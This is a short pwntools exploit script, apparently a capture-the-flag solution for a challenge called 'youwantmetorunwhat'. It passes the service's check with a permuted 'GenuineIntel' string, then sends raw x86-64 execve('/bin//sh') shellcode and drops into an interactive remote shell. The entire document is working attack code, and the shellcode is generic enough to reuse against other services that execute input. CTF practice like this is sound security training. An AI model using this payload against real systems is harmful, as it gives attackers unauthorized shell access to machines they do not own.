#!/usr/bin/python3
from pwn import *

elf = context.binary = ELF("youwantmetorunwhat")
libc = elf.libc

local = False 
if local:
    p = process("./youwantmetorunwhat")
    gdb.attach(p,'''''')
else:
    p = remote('you-want-me-to-run-what.chall.lol', 60006)

elf = context.binary = ELF('./youwantmetorunwhat', checksec=False)

a = b"uneG"
b = b"letn"
c = b"Ieni"

sum0 = a + b + c
sum1 = a + c + b
sum2 = b + a + c
sum3 = b + c + a
sum4 = c + a + b
sum5 = c + b + a

shellcode = b"\x50\x48\x31\xd2\x48\x31\xf6\x48\xbb\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x53\x54\x5f\xb0\x3b\x0f\x05"
payload = sum5
p.sendlineafter(b"MMMM you want me to run WHAT?", payload)
p.sendline(shellcode)
p.interactive()